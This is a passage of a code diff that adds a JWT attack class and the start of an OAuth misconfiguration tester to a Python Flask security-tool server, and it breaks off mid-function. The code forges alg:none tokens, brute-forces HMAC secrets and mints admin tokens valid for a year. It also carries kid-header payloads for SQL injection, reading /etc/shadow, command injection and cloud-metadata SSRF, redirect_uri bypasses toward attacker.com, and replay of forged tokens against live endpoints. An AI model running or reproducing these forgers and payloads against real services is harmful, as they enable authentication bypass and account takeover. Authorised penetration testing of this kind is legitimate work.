@@ -28,6 +28,8 @@ import traceback
 import threading
 import time
 import hashlib
+import hmac
+import binascii
 import pickle
 import base64
 import queue
@@ -23550,6 +23552,1094 @@ def api_key_bruteforce_route():
         return jsonify(result)
     except Exception as e:
         logger.error(f"💥 apikey/bruteforce error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+class JWTAttacker:
+    """
+    JWT attack suite: decode/inspect, alg:none, weak-secret brute-force,
+    algorithm confusion (RS256→HS256), kid/jku/jwk header injection,
+    exp/nbf manipulation, null signature, and endpoint replay testing.
+    """
+
+    ALG_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe"]
+
+    COMMON_SECRETS = [
+        "secret", "password", "changeme", "123456", "qwerty",
+        "letmein", "admin", "root", "test", "demo", "key",
+        "jwt_secret", "jwt-secret", "jwtsecret", "mysecret",
+        "your-256-bit-secret", "your-secret", "supersecret",
+        "secretkey", "secret_key", "api_secret", "app_secret",
+        "private_key", "privatekey", "signing_key", "hmac_key",
+        "HS256", "HS384", "HS512", "RS256",
+        "SjhpGmV2bXlKZXlKaGJHY2lPaUpJ",   # base64 of common phrases
+        "verysecretkey", "unsafe", "weak", "12345678",
+        "abcdefgh", "iloveyou", "sunshine", "monkey", "dragon",
+        "master", "access", "login", "pass", "1234",
+        "token", "tokenkey", "authkey", "auth_key",
+    ]
+
+    KID_INJECTIONS = [
+        # SQL injection
+        ("sql_union",   "' UNION SELECT 'attacker_key' --"),
+        ("sql_or",      "' OR '1'='1"),
+        ("sql_sleep",   "'; WAITFOR DELAY '0:0:5'--"),
+        # Path traversal
+        ("traversal_dev_null", "../../dev/null"),
+        ("traversal_passwd",   "../../../../etc/passwd"),
+        ("traversal_shadow",   "../../../../etc/shadow"),
+        # Null byte
+        ("null_byte",   "\x00"),
+        # Command injection
+        ("cmd_inject",  "; ls -la #"),
+        ("cmd_inject2", "| id #"),
+        # SSRF via kid URL
+        ("ssrf_url",    "http://169.254.169.254/latest/meta-data/"),
+    ]
+
+    # ------------------------------------------------------------------ helpers
+    @staticmethod
+    def _b64url_decode(s: str) -> bytes:
+        s = s.replace("-", "+").replace("_", "/")
+        pad = 4 - len(s) % 4
+        if pad != 4:
+            s += "=" * pad
+        return base64.b64decode(s)
+
+    @staticmethod
+    def _b64url_encode(b: bytes) -> str:
+        return base64.b64encode(b).decode().replace("+", "-").replace("/", "_").rstrip("=")
+
+    def _split_token(self, token: str):
+        parts = token.split(".")
+        if len(parts) != 3:
+            raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
+        return parts
+
+    def _decode_part(self, part: str) -> Dict:
+        try:
+            return json.loads(self._b64url_decode(part))
+        except Exception:
+            return {}
+
+    def _sign_hs(self, header_b64: str, payload_b64: str, secret: str, alg: str) -> str:
+        msg = f"{header_b64}.{payload_b64}".encode()
+        hash_map = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}
+        digest_name = hash_map.get(alg.upper(), "sha256")
+        sig = hmac.new(secret.encode(), msg, digestmod=digest_name).digest()
+        return self._b64url_encode(sig)
+
+    def _rebuild_token(self, header: Dict, payload: Dict, secret: str = "", alg_override: str = "") -> str:
+        h = dict(header)
+        if alg_override:
+            h["alg"] = alg_override
+        h_enc = self._b64url_encode(json.dumps(h, separators=(",", ":")).encode())
+        p_enc = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        alg   = h.get("alg", "HS256")
+        if alg.lower() == "none":
+            return f"{h_enc}.{p_enc}."
+        sig = self._sign_hs(h_enc, p_enc, secret, alg)
+        return f"{h_enc}.{p_enc}.{sig}"
+
+    # ------------------------------------------------------------------ 1. decode + inspect
+    def decode_token(self, token: str) -> Dict:
+        """Decode and analyse a JWT — no verification."""
+        try:
+            parts   = self._split_token(token)
+            header  = self._decode_part(parts[0])
+            payload = self._decode_part(parts[1])
+        except Exception as e:
+            return {"error": str(e)}
+
+        issues = []
+        alg = header.get("alg", "").upper()
+
+        if alg == "NONE":
+            issues.append({"severity": "CRITICAL", "issue": "Algorithm is 'none' — no signature"})
+        if alg in ("HS256", "HS384", "HS512"):
+            issues.append({"severity": "INFO", "issue": f"HMAC ({alg}) — susceptible to secret brute-force"})
+        if alg.startswith("RS") or alg.startswith("ES"):
+            issues.append({"severity": "INFO", "issue": f"Asymmetric ({alg}) — try RS256→HS256 confusion"})
+
+        exp = payload.get("exp")
+        if exp:
+            remaining = exp - time.time()
+            if remaining < 0:
+                issues.append({"severity": "MEDIUM", "issue": f"Token expired {abs(int(remaining))}s ago"})
+            elif remaining > 86400 * 30:
+                issues.append({"severity": "MEDIUM", "issue": f"Very long expiry: {int(remaining/86400)} days"})
+        else:
+            issues.append({"severity": "HIGH", "issue": "No 'exp' claim — token never expires"})
+
+        if not payload.get("aud"):
+            issues.append({"severity": "LOW", "issue": "No 'aud' claim — audience not restricted"})
+        if not payload.get("iss"):
+            issues.append({"severity": "LOW", "issue": "No 'iss' claim — issuer not specified"})
+
+        for claim in ("kid", "jku", "x5u", "jwk"):
+            if claim in header:
+                issues.append({"severity": "HIGH", "issue": f"Header contains '{claim}' — injection possible"})
+
+        return {
+            "header":  header,
+            "payload": payload,
+            "issues":  issues,
+            "alg":     alg,
+            "exp":     exp,
+            "sub":     payload.get("sub", ""),
+            "iss":     payload.get("iss", ""),
+        }
+
+    # ------------------------------------------------------------------ 2. alg:none
+    def alg_none_tokens(self, token: str) -> List[Dict]:
+        """Generate alg:none variants — signature stripped."""
+        results = []
+        try:
+            parts   = self._split_token(token)
+            payload = self._decode_part(parts[1])
+            header  = self._decode_part(parts[0])
+        except Exception as e:
+            return [{"error": str(e)}]
+
+        for variant in self.ALG_NONE_VARIANTS:
+            h_mod    = dict(header)
+            h_mod["alg"] = variant
+            h_enc    = self._b64url_encode(json.dumps(h_mod, separators=(",", ":")).encode())
+            p_enc    = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+            # Some parsers accept missing sig, trailing dot, or double dot
+            for sig_variant in [f"{h_enc}.{p_enc}.", f"{h_enc}.{p_enc}", f"{h_enc}.{p_enc}.."]:
+                results.append({
+                    "technique":   "alg_none",
+                    "alg_variant": variant,
+                    "token":       sig_variant,
+                    "description": f"alg set to '{variant}', signature removed",
+                })
+
+        return results
+
+    # ------------------------------------------------------------------ 3. weak secret brute-force
+    def brute_secret(self, token: str, extra_wordlist: Optional[List[str]] = None) -> Dict:
+        """HMAC secret brute-force — HS256/384/512."""
+        try:
+            parts  = self._split_token(token)
+            header = self._decode_part(parts[0])
+            alg    = header.get("alg", "HS256").upper()
+        except Exception as e:
+            return {"error": str(e)}
+
+        if not alg.startswith("HS"):
+            return {"cracked": False, "reason": f"Algorithm {alg} not HMAC — cannot brute-force secret"}
+
+        wl  = self.COMMON_SECRETS + (extra_wordlist or [])
+        msg = f"{parts[0]}.{parts[1]}".encode()
+
+        hash_map = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}
+        digest_name = hash_map.get(alg, "sha256")
+
+        try:
+            expected_sig = self._b64url_decode(parts[2])
+        except Exception as e:
+            return {"error": f"Cannot decode signature: {e}"}
+
+        for secret in wl:
+            try:
+                candidate = hmac.new(secret.encode(), msg, digestmod=digest_name).digest()
+                if hmac.compare_digest(candidate, expected_sig):
+                    # Re-sign with admin claims
+                    payload  = self._decode_part(parts[1])
+                    elevated = dict(payload)
+                    elevated["role"]  = "admin"
+                    elevated["admin"] = True
+                    elevated["exp"]   = int(time.time()) + 86400 * 365
+                    forged = self._rebuild_token(header, elevated, secret)
+                    return {
+                        "cracked":        True,
+                        "secret":         secret,
+                        "algorithm":      alg,
+                        "forged_admin_token": forged,
+                        "original_claims":    payload,
+                        "elevated_claims":    elevated,
+                        "severity":       "CRITICAL",
+                    }
+            except Exception:
+                continue
+
+        return {"cracked": False, "algorithm": alg, "wordlist_size": len(wl)}
+
+    # ------------------------------------------------------------------ 4. RS256 → HS256 confusion
+    def rs256_hs256_confusion(self, token: str, public_key_pem: str = "") -> Dict:
+        """
+        Sign with the server's RSA public key as the HMAC secret.
+        The server expects RS256 but verifies an HS256 signature using its own pubkey.
+        """
+        if not public_key_pem:
+            return {
+                "applicable": False,
+                "reason": "Provide the server's RSA public key (PEM) to attempt confusion attack",
+                "tip": "Fetch from /.well-known/jwks.json or /oauth/v2/keys",
+            }
+        try:
+            parts   = self._split_token(token)
+            header  = self._decode_part(parts[0])
+            payload = self._decode_part(parts[1])
+
+            if not header.get("alg", "").startswith("RS"):
+                return {"applicable": False, "reason": f"Token uses {header.get('alg')} — not RS*"}
+
+            # Build HS256 header
+            h_mod    = dict(header)
+            h_mod["alg"] = "HS256"
+            h_enc    = self._b64url_encode(json.dumps(h_mod, separators=(",", ":")).encode())
+            p_enc    = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+            msg      = f"{h_enc}.{p_enc}".encode()
+            sig      = hmac.new(public_key_pem.encode(), msg, digestmod="sha256").digest()
+            confused = f"{h_enc}.{p_enc}.{self._b64url_encode(sig)}"
+
+            return {
+                "applicable":      True,
+                "technique":       "rs256_hs256_confusion",
+                "confused_token":  confused,
+                "description":     "RSA public key used as HMAC-SHA256 secret",
+                "severity":        "CRITICAL",
+            }
+        except Exception as e:
+            return {"applicable": False, "error": str(e)}
+
+    # ------------------------------------------------------------------ 5. kid injection
+    def kid_injection_tokens(self, token: str) -> List[Dict]:
+        """Generate kid-injected JWT variants."""
+        results = []
+        try:
+            parts   = self._split_token(token)
+            header  = self._decode_part(parts[0])
+            payload = self._decode_part(parts[1])
+        except Exception as e:
+            return [{"error": str(e)}]
+
+        for name, kid_val in self.KID_INJECTIONS:
+            h_mod      = dict(header)
+            h_mod["kid"] = kid_val
+            h_mod["alg"] = "HS256"
+            # For SQL/traversal injections the "secret" becomes the injected result
+            # Most commonly the empty string (from /dev/null) is the HMAC key
+            secret = "" if "traversal" in name or "null" in name else "attacker_key"
+            forged = self._rebuild_token(h_mod, payload, secret, alg_override="HS256")
+            results.append({
+                "technique":   "kid_injection",
+                "variant":     name,
+                "kid":         kid_val,
+                "secret_used": secret,
+                "token":       forged,
+                "description": f"kid set to {name} injection payload",
+            })
+
+        return results
+
+    # ------------------------------------------------------------------ 6. jku / x5u injection
+    def jku_injection_token(self, token: str, attacker_jwks_url: str) -> Dict:
+        """
+        Replace jku/x5u header with attacker-controlled JWKS URL.
+        Generates an RSA-like forged token pointing to the attacker URL.
+        Real exploitation requires serving a JWKS at that URL.
+        """
+        try:
+            parts   = self._split_token(token)
+            header  = self._decode_part(parts[0])
+            payload = self._decode_part(parts[1])
+        except Exception as e:
+            return {"error": str(e)}
+
+        for inj_hdr in ("jku", "x5u"):
+            h_mod = dict(header)
+            h_mod[inj_hdr] = attacker_jwks_url
+            # Remove existing kid to avoid conflict
+            h_mod.pop("kid", None)
+            h_enc = self._b64url_encode(json.dumps(h_mod, separators=(",", ":")).encode())
+            p_enc = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+            # Dummy signature — real server would verify against attacker JWKS
+            dummy_sig = self._b64url_encode(b"\x00" * 32)
+            forged    = f"{h_enc}.{p_enc}.{dummy_sig}"
+            return {
+                "technique":         f"{inj_hdr}_injection",
+                "injection_header":  inj_hdr,
+                "attacker_jwks_url": attacker_jwks_url,
+                "token":             forged,
+                "severity":          "CRITICAL",
+                "description":       (
+                    f"'{inj_hdr}' header points to attacker JWKS. "
+                    f"Host a JWKS at {attacker_jwks_url} containing your public key, "
+                    "then sign the token with the corresponding private key."
+                ),
+                "jwks_template": json.dumps({
+                    "keys": [{
+                        "kty": "RSA", "use": "sig", "alg": "RS256",
+                        "kid": h_mod.get("kid", "attacker"),
+                        "n": "<base64url-encoded-modulus>",
+                        "e": "AQAB",
+                    }]
+                }, indent=2),
+            }
+
+        return {"error": "Could not build jku injection token"}
+
+    # ------------------------------------------------------------------ 7. jwk embedded key
+    def jwk_embedded_token(self, token: str) -> Dict:
+        """Embed a self-signed JWK in the header (no external URL needed)."""
+        try:
+            parts   = self._split_token(token)
+            header  = self._decode_part(parts[0])
+            payload = self._decode_part(parts[1])
+        except Exception as e:
+            return {"error": str(e)}
+
+        # Use HS256 with embedded symmetric key for simplicity
+        h_mod = dict(header)
+        h_mod["alg"] = "HS256"
+        h_mod["jwk"] = {
+            "kty": "oct",
+            "use": "sig",
+            "k":   self._b64url_encode(b"attacker_embedded_key"),
+            "alg": "HS256",
+        }
+        h_mod.pop("kid", None)
+        forged = self._rebuild_token(h_mod, payload, "attacker_embedded_key", alg_override="HS256")
+        return {
+            "technique":   "jwk_embedded",
+            "token":       forged,
+            "embedded_key":"attacker_embedded_key",
+            "severity":    "CRITICAL",
+            "description": (
+                "Symmetric JWK embedded in header. Vulnerable parsers accept the "
+                "embedded key as the verification key, allowing arbitrary claims."
+            ),
+        }
+
+    # ------------------------------------------------------------------ 8. exp / nbf manipulation
+    def exp_manipulation_tokens(self, token: str, secret: str = "") -> List[Dict]:
+        """Generate exp-manipulated variants (expired→valid, far-future, no exp, nbf future)."""
+        results = []
+        try:
+            parts   = self._split_token(token)
+            header  = self._decode_part(parts[0])
+            payload = self._decode_part(parts[1])
+        except Exception as e:
+            return [{"error": str(e)}]
+
+        # If no secret, use alg:none variants
+        def forge(p: Dict, desc: str) -> Dict:
+            if secret:
+                tok = self._rebuild_token(header, p, secret)
+            else:
+                # alg:none fallback
+                h_mod    = dict(header)
+                h_mod["alg"] = "none"
+                h_enc    = self._b64url_encode(json.dumps(h_mod, separators=(",", ":")).encode())
+                p_enc    = self._b64url_encode(json.dumps(p, separators=(",", ":")).encode())
+                tok      = f"{h_enc}.{p_enc}."
+            return {"technique": "exp_manipulation", "description": desc, "token": tok}
+
+        # Remove exp entirely
+        p1 = {k: v for k, v in payload.items() if k != "exp"}
+        results.append(forge(p1, "exp claim removed"))
+
+        # Far-future exp
+        p2 = dict(payload)
+        p2["exp"] = int(time.time()) + 86400 * 3650  # 10 years
+        results.append(forge(p2, "exp set to 10 years from now"))
+
+        # nbf in far future (should be rejected, test if server ignores)
+        p3 = dict(payload)
+        p3["nbf"] = int(time.time()) + 86400 * 365
+        p3["exp"] = int(time.time()) + 86400 * 3650
+        results.append(forge(p3, "nbf set to future (should fail), exp 10 years"))
+
+        # iat zeroed (issued at epoch)
+        p4 = dict(payload)
+        p4["iat"] = 0
+        results.append(forge(p4, "iat set to epoch (0) — very old token"))
+
+        return results
+
+    # ------------------------------------------------------------------ 9. replay on endpoints
+    def _replay_token(self, token: str, endpoint: str, method: str = "GET") -> Dict:
+        """Send a token to an endpoint and classify the response."""
+        hdrs = {
+            "Authorization": f"Bearer {token}",
+            "X-Auth-Token":  token,
+        }
+        try:
+            r = requests.request(method, endpoint, headers=hdrs, timeout=10, allow_redirects=True)
+            return {
+                "status":  r.status_code,
+                "length":  len(r.text or ""),
+                "snippet": (r.text or "")[:200],
+                "accepted":r.status_code not in (401, 403),
+            }
+        except Exception as e:
+            return {"error": str(e), "accepted": False}
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        token:            str,
+        endpoint:         str         = "",
+        public_key_pem:   str         = "",
+        attacker_jwks_url:str         = "",
+        extra_wordlist:   Optional[List[str]] = None,
+        run_brute:        bool        = True,
+        run_alg_none:     bool        = True,
+        run_kid:          bool        = True,
+        run_confusion:    bool        = True,
+        run_exp:          bool        = True,
+        run_jku:          bool        = True,
+        run_jwk:          bool        = True,
+    ) -> Dict:
+        start   = time.time()
+        results = {}
+
+        # Always decode
+        results["decoded"] = self.decode_token(token)
+        alg = results["decoded"].get("alg", "")
+
+        if run_alg_none:
+            results["alg_none"]   = self.alg_none_tokens(token)
+
+        if run_brute and alg.startswith("HS"):
+            results["brute_force"] = self.brute_secret(token, extra_wordlist)
+
+        if run_confusion and (alg.startswith("RS") or alg.startswith("ES")):
+            results["rs256_hs256"] = self.rs256_hs256_confusion(token, public_key_pem)
+
+        if run_kid:
+            results["kid_injections"] = self.kid_injection_tokens(token)
+
+        if run_jku and attacker_jwks_url:
+            results["jku_injection"] = self.jku_injection_token(token, attacker_jwks_url)
+
+        if run_jwk:
+            results["jwk_embedded"] = self.jwk_embedded_token(token)
+
+        if run_exp:
+            results["exp_manipulation"] = self.exp_manipulation_tokens(token, "")
+
+        # Replay tests if endpoint given
+        if endpoint:
+            replay_results = {}
+            if results.get("alg_none"):
+                for v in results["alg_none"][:2]:
+                    if "token" in v:
+                        r = self._replay_token(v["token"], endpoint)
+                        if r.get("accepted"):
+                            replay_results[f"alg_none_{v['alg_variant']}"] = r
+            if results.get("brute_force", {}).get("cracked"):
+                t = results["brute_force"].get("forged_admin_token", "")
+                if t:
+                    replay_results["forged_admin"] = self._replay_token(t, endpoint)
+            results["replay_tests"] = replay_results
+
+        # Build summary
+        criticals = 0
+        if results.get("brute_force", {}).get("cracked"):
+            criticals += 1
+        if results.get("rs256_hs256", {}).get("applicable"):
+            criticals += 1
+        if results.get("jku_injection", {}).get("severity") == "CRITICAL":
+            criticals += 1
+        if results.get("jwk_embedded", {}).get("severity") == "CRITICAL":
+            criticals += 1
+
+        results["summary"] = {
+            "algorithm":  alg,
+            "criticals":  criticals,
+            "cracked":    results.get("brute_force", {}).get("cracked", False),
+            "alg_none_variants": len(results.get("alg_none", [])),
+            "kid_variants":      len(results.get("kid_injections", [])),
+            "exp_variants":      len(results.get("exp_manipulation", [])),
+            "duration_sec":      round(time.time() - start, 2),
+        }
+        return results
+
+
+jwt_attacker = JWTAttacker()
+
+
+@app.route("/api/tools/jwt/attack", methods=["POST"])
+def jwt_attack_route():
+    try:
+        params = request.json or {}
+        result = jwt_attacker.run(
+            token=params.get("token", ""),
+            endpoint=params.get("endpoint", ""),
+            public_key_pem=params.get("public_key_pem", ""),
+            attacker_jwks_url=params.get("attacker_jwks_url", ""),
+            extra_wordlist=params.get("extra_wordlist"),
+            run_brute=bool(params.get("run_brute", True)),
+            run_alg_none=bool(params.get("run_alg_none", True)),
+            run_kid=bool(params.get("run_kid", True)),
+            run_confusion=bool(params.get("run_confusion", True)),
+            run_exp=bool(params.get("run_exp", True)),
+            run_jku=bool(params.get("run_jku", True)),
+            run_jwk=bool(params.get("run_jwk", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 jwt/attack error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+class OAuthTester:
+    """
+    OAuth 2.0 / OIDC misconfiguration tester: discovery, redirect_uri bypass,
+    state CSRF, PKCE downgrade, token leakage, scope creep, implicit flow,
+    token endpoint misconfig, and token replay/introspection checks.
+    """
+
+    OIDC_DISCOVERY_PATHS = [
+        "/.well-known/openid-configuration",
+        "/.well-known/oauth-authorization-server",
+        "/oauth/.well-known/openid-configuration",
+        "/api/.well-known/openid-configuration",
+        "/.well-known/jwks.json",
+        "/oauth/keys",
+        "/oauth/v2/keys",
+        "/.well-known/keys",
+    ]
+
+    REDIRECT_URI_BYPASSES = [
+        # Open redirect variants
+        "{legit}@attacker.com",
+        "{legit}%40attacker.com",
+        "attacker.com?redirect={legit}",
+        "attacker.com%23{legit}",
+        # Domain tricks
+        "{legit}.attacker.com",
+        "{scheme}://attacker.com/{legit}",
+        # Path traversal
+        "{base}/../../attacker.com",
+        "{base}/../attacker.com",
+        # Double slash
+        "{scheme}://attacker.com//legit",
+        # Fragment confusion
+        "{base}#.attacker.com",
+        # Port injection
+        "{base}:80@attacker.com",
+        # Encoded slashes
+        "{scheme}:/{encoded_slash}attacker.com",
+        # Param pollution
+        "{base}&redirect_uri=https://attacker.com",
+        # Null byte
+        "{base}\x00.attacker.com",
+    ]
+
+    SENSITIVE_SCOPES = [
+        "openid", "email", "profile", "address", "phone",
+        "offline_access",
+        "admin", "superuser", "root",
+        "read:all", "write:all", "delete:all",
+        "user:*", "*", ".*",
+        "api", "api:full",
+        "https://www.googleapis.com/auth/cloud-platform",  # GCP
+        "https://graph.microsoft.com/.default",             # Azure
+        "urn:ietf:params:oauth:scope:openid",
+    ]
+
+    # ------------------------------------------------------------------ helpers
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"})
+
+    def _get(self, url: str, **kwargs) -> Optional[requests.Response]:
+        try:
+            return self.session.get(url, timeout=10, allow_redirects=False, **kwargs)
+        except Exception:
+            return None
+
+    def _post(self, url: str, data: Dict, **kwargs) -> Optional[requests.Response]:
+        try:
+            return self.session.post(url, data=data, timeout=10, **kwargs)
+        except Exception:
+            return None
+
+    def _parse_url_base(self, url: str) -> Tuple[str, str, str]:
+        p = urllib.parse.urlparse(url)
+        return p.scheme, p.netloc, f"{p.scheme}://{p.netloc}"
+
+    # ------------------------------------------------------------------ 1. OIDC discovery
+    def discover(self, target: str) -> Dict:
+        """Probe OIDC/OAuth discovery endpoints."""
+        found = []
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        for path in self.OIDC_DISCOVERY_PATHS:
+            url = target.rstrip("/") + path
+            r   = self._get(url)
+            if r and r.status_code == 200:
+                try:
+                    data = r.json()
+                    issues = []
+                    # Check for HTTP endpoints in config
+                    for key in ("authorization_endpoint", "token_endpoint", "jwks_uri",
+                                "userinfo_endpoint", "introspection_endpoint",
+                                "revocation_endpoint", "registration_endpoint"):
+                        val = data.get(key, "")
+                        if val.startswith("http://"):
+                            issues.append({
+                                "severity": "HIGH",
+                                "issue":    f"'{key}' uses HTTP: {val}",
+                            })
+                    # PKCE support
+                    pkce_methods = data.get("code_challenge_methods_supported", [])
+                    if not pkce_methods:
+                        issues.append({"severity": "MEDIUM", "issue": "PKCE (code_challenge_methods_supported) not advertised"})
+                    # Implicit flow
+                    rt = data.get("response_types_supported", [])
+                    if "token" in rt or "id_token token" in rt:
+                        issues.append({"severity": "MEDIUM", "issue": "Implicit flow (token response_type) supported — token exposed in URL fragment"})
+                    # Response modes
+                    rm = data.get("response_modes_supported", [])
+                    if "fragment" in rm:
+                        issues.append({"severity": "MEDIUM", "issue": "fragment response_mode supported — tokens in URL fragments"})
+                    # No introspection
+                    if not data.get("introspection_endpoint"):
+                        issues.append({"severity": "INFO", "issue": "No introspection_endpoint advertised"})
+                    # Grant types
+                    grants = data.get("grant_types_supported", [])
+                    if "password" in grants:
+                        issues.append({"severity": "HIGH", "issue": "Resource Owner Password Credentials grant supported (deprecated, credential exposure risk)"})
+                    if "implicit" in grants:
+                        issues.append({"severity": "MEDIUM", "issue": "Implicit grant type supported"})
+
+                    found.append({
+                        "url":    url,
+                        "config": data,
+                        "issues": issues,
+                    })
+                except Exception:
+                    found.append({"url": url, "raw": r.text[:500], "issues": []})
+
+        return {"discovery_docs": found, "count": len(found)}
+
+    # ------------------------------------------------------------------ 2. redirect_uri bypass
+    def redirect_uri_bypass(
+        self,
+        authorization_endpoint: str,
+        client_id:              str,
+        legitimate_redirect:    str,
+    ) -> List[Dict]:
+        """Generate and test redirect_uri bypass payloads."""
+        if not authorization_endpoint or not client_id:
+            return [{"error": "authorization_endpoint and client_id required"}]
+
+        scheme, netloc, base = self._parse_url_base(legitimate_redirect)
+        encoded_slash = urllib.parse.quote("/", safe="")
+        findings = []
+
+        for template in self.REDIRECT_URI_BYPASSES:
+            bypass_uri = (
+                template
+                .replace("{legit}",         urllib.parse.quote(legitimate_redirect, safe=""))
+                .replace("{scheme}",        scheme)
+                .replace("{base}",          legitimate_redirect.rstrip("/"))
+                .replace("{encoded_slash}", encoded_slash)
+            )
+
+            # Build auth URL
+            params = urllib.parse.urlencode({
+                "response_type": "code",
+                "client_id":     client_id,
+                "redirect_uri":  bypass_uri,
+                "scope":         "openid",
+                "state":         "test_state",
+            })
+            auth_url = f"{authorization_endpoint}?{params}"
+            r = self._get(auth_url)
+
+            if r is None:
+                continue
+
+            # 302 to our bypass URI → accepted
+            location = r.headers.get("Location", "")
+            redirected_to_bypass = "attacker.com" in location or bypass_uri in location
+            accepted = r.status_code in (302, 301) and redirected_to_bypass
+
+            if accepted or r.status_code not in (400, 401, 403):
+                findings.append({
+                    "bypass_uri":  bypass_uri,
+                    "template":    template,
+                    "status":      r.status_code,
+                    "location":    location[:120],
+                    "accepted":    accepted,
+                    "severity":    "CRITICAL" if accepted else "MEDIUM",
+                    "detail":      "Redirect accepted" if accepted else f"Unexpected status {r.status_code}",
+                })
+
+        return findings
+
+    # ------------------------------------------------------------------ 3. state CSRF check
+    def state_csrf_check(
+        self,
+        authorization_endpoint: str,
+        client_id:              str,
+        redirect_uri:           str,
+    ) -> Dict:
+        """Test if state parameter is enforced."""
+        if not authorization_endpoint:
+            return {"error": "authorization_endpoint required"}
+
+        results = {}
+
+        # Missing state
+        p1 = urllib.parse.urlencode({
+            "response_type": "code",
+            "client_id":     client_id,
+            "redirect_uri":  redirect_uri,
+            "scope":         "openid",
+        })
+        r1 = self._get(f"{authorization_endpoint}?{p1}")
+        results["missing_state"] = {
+            "status":  r1.status_code if r1 else None,
+            "issue":   "State parameter missing — server should reject" if r1 and r1.status_code not in (400, 302) else "OK",
+            "accepted":r1 and r1.status_code == 302,
+        }
+
+        # Empty state
+        p2 = urllib.parse.urlencode({
+            "response_type": "code",
+            "client_id":     client_id,
+            "redirect_uri":  redirect_uri,
+            "scope":         "openid",
+            "state":         "",
+        })
+        r2 = self._get(f"{authorization_endpoint}?{p2}")
+        results["empty_state"] = {
+            "status":  r2.status_code if r2 else None,
+            "accepted":r2 and r2.status_code == 302,
+        }
+
+        # Predictable state (fixed value)
+        p3 = urllib.parse.urlencode({
+            "response_type": "code",
+            "client_id":     client_id,
+            "redirect_uri":  redirect_uri,
+            "scope":         "openid",
+            "state":         "csrf",
+        })
+        r3 = self._get(f"{authorization_endpoint}?{p3}")
+        results["predictable_state"] = {
+            "status":  r3.status_code if r3 else None,
+            "accepted":r3 and r3.status_code == 302,
+        }
+
+        # Assess
+        issues = []
+        if results["missing_state"].get("accepted"):
+            issues.append({"severity": "HIGH", "issue": "Missing state accepted — CSRF possible"})
+        if results["empty_state"].get("accepted"):
+            issues.append({"severity": "HIGH", "issue": "Empty state accepted — CSRF possible"})
+        if results["predictable_state"].get("accepted"):
+            issues.append({"severity": "MEDIUM", "issue": "Predictable state value accepted"})
+
+        return {"checks": results, "issues": issues}
+
+    # ------------------------------------------------------------------ 4. PKCE downgrade
+    def pkce_downgrade(
+        self,
+        authorization_endpoint: str,
+        client_id:              str,
+        redirect_uri:           str,
+    ) -> Dict:
+        """Test if PKCE is enforced — try authorization code flow without code_challenge."""
+        if not authorization_endpoint:
+            return {"error": "authorization_endpoint required"}
+
+        # Request without PKCE
+        p = urllib.parse.urlencode({
+            "response_type": "code",
+            "client_id":     client_id,
+            "redirect_uri":  redirect_uri,
+            "scope":         "openid",
+            "state":         "pkce_test",
+        })
+        r = self._get(f"{authorization_endpoint}?{p}")
+        accepted = r and r.status_code == 302 and "code=" in r.headers.get("Location", "")
+        return {
+            "status":   r.status_code if r else None,
+            "accepted": accepted,
+            "severity": "HIGH" if accepted else "INFO",
+            "issue":    "PKCE not enforced — authorization code flow works without code_challenge" if accepted else "PKCE enforced (or no code returned)",
+        }
+
+    # ------------------------------------------------------------------ 5. implicit flow token leakage
+    def implicit_flow_check(
+        self,
+        authorization_endpoint: str,
+        client_id:              str,
+        redirect_uri:           str,
+    ) -> Dict:
+        """Test if server supports implicit flow (token in URL fragment)."""
+        if not authorization_endpoint:
+            return {"error": "authorization_endpoint required"}
+
+        p = urllib.parse.urlencode({
+            "response_type": "token",
+            "client_id":     client_id,
+            "redirect_uri":  redirect_uri,
+            "scope":         "openid",
+            "state":         "implicit_test",
+        })
+        r = self._get(f"{authorization_endpoint}?{p}")
+        loc = r.headers.get("Location", "") if r else ""
+        token_in_fragment = "#access_token=" in loc or "access_token=" in loc
+        return {
+            "status":             r.status_code if r else None,
+            "location":           loc[:150],
+            "token_in_fragment":  token_in_fragment,
+            "severity":           "HIGH" if token_in_fragment else "INFO",
+            "issue":              "Implicit flow grants access_token in URL fragment — leaks in Referer/history/logs" if token_in_fragment else "Implicit flow not accepted or no token returned",
+        }
+
+    # ------------------------------------------------------------------ 6. scope creep
+    def scope_creep_check(
+        self,
+        authorization_endpoint: str,
+        client_id:              str,
+        redirect_uri:           str,
+    ) -> List[Dict]:
+        """Request over-privileged scopes and see which are granted."""
+        if not authorization_endpoint:
+            return [{"error": "authorization_endpoint required"}]
+
+        findings = []
+        for scope in self.SENSITIVE_SCOPES:
+            p = urllib.parse.urlencode({
+                "response_type": "code",
+                "client_id":     client_id,
+                "redirect_uri":  redirect_uri,
+                "scope":         f"openid {scope}",
+                "state":         "scope_test",
+            })
+            r = self._get(f"{authorization_endpoint}?{p}")
+            if r and r.status_code == 302:
+                loc = r.headers.get("Location", "")
+                if "error" not in loc and "denied" not in loc.lower():
+                    findings.append({
+                        "scope":    scope,
+                        "accepted": True,
+                        "status":   r.status_code,
+                        "severity": "HIGH" if scope in ("admin", "superuser", "root", "*") else "MEDIUM",
+                        "detail":   f"Scope '{scope}' accepted without error",
+                    })
+
+        return findings
+
+    # ------------------------------------------------------------------ 7. token endpoint misconfig
+    def token_endpoint_checks(self, token_endpoint: str, client_id: str, client_secret: str = "") -> Dict:
+        """Check token endpoint for common misconfigurations."""
+        if not token_endpoint:
+            return {"error": "token_endpoint required"}
+
+        issues = []
+
+        # HTTP check
+        if token_endpoint.startswith("http://"):
+            issues.append({"severity": "CRITICAL", "issue": "Token endpoint uses HTTP — credentials transmitted in clear text"})
+
+        # client_secret in URL
+        if client_secret and client_secret in token_endpoint:
+            issues.append({"severity": "CRITICAL", "issue": "client_secret embedded in token endpoint URL"})
+
+        # Test unauthenticated token exchange (no client auth)
+        r = self._post(token_endpoint, {
+            "grant_type": "authorization_code",
